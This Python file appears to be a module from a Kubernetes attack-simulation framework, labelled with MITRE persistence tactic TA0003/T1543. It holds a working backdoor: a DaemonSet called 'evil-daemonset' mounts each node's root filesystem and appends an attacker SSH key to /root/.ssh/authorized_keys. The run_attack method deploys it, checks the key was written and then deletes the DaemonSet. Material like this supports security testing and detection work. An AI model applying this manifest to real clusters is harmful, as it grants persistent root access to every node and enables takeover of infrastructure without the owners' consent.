from testing.testing import Testing
import time
import subprocess

class BackdoorContainer(Testing):
    def __init__(self):
        super().__init__()
        self.name = "Backdoor Container"
        self.mitre_tactic = "TA0003"
        self.mitre_technique = "T1543"
        self.microsoft_technique = "MS-TA9012"
        self.pod = {
            "apiVersion": "apps/v1",
            "kind": "DaemonSet",
            "metadata": {
                "name": "evil-daemonset",
                "labels": {
                    "app": "evil-daemonset"
                }
            },
            "spec": {
                "selector": {
                    "matchLabels": {
                        "app": "evil-daemonset"
                    }
                },
                "template": {
                    "metadata": {
                        "labels": {
                            "app": "evil-daemonset"
                        }
                    },
                    "spec": {
                        "containers": [
                            {
                                "name": "evil",
                                "image": "ubuntu",
                                "command": ["/bin/sh", "-c", "mkdir -p /host/root/.ssh && echo 'ssh-rsa AAAAB3NzaC1y...CUkwfwh+iSTP' >> /host/root/.ssh/authorized_keys && sleep 600"],
                                "volumeMounts": [
                                    {
                                        "name": "host",
                                        "mountPath": "/host"
                                    }
                                ]
                            }
                        ],
                        "volumes": [
                            {
                                "name": "host",
                                "hostPath": {
                                    "path": "/"
                                }
                            }
                        ]
                    }
                }
            }
        }
        
    def run_attack(self):
        if self.check_install_kubectl():   
            
                # Creating Pod evil-daemonset
                print("# Creating Pod evil-daemonset...")
                self.kubectl_create_file("evil-daemonset.yaml", self.pod)
                self.kubectl_apply("evil-daemonset.yaml", add_command=True)
                
                print("\n# Waiting for the DaemonSet to write ssh-key in /root/.ssh/authorized_keys...")
                while not self.kubectl_is_daemonset_ready("evil-daemonset"):
                    time.sleep(1)

                print("root@near-dev:/# sudo cat /root/.ssh/authorized_keys")
                output, error = self.cat_folder("/root/.ssh/authorized_keys")
                print(output)
                
                if self.error:
                    print("An Error has occured: " + error)
                else:
                    self.output["sudo cat /root/.ssh/authorized_keys"] = output
                    
                # Cleanup
                self.cleanup()

    def cleanup(self):
         # Delete Pod evil-daemonset
        print("\n# Deleting Pod evil-daemonset...")
        self.kubectl_delete("evil-daemonset","daemonset")
        
        print("\n# Deleting evil-daemonset.yaml...")
        self.delete_file("evil-daemonset.yaml")


    def display_help(self):
        pass

    def check_prerequisites(self):
        pass

    def determine_executable_path(self):
        pass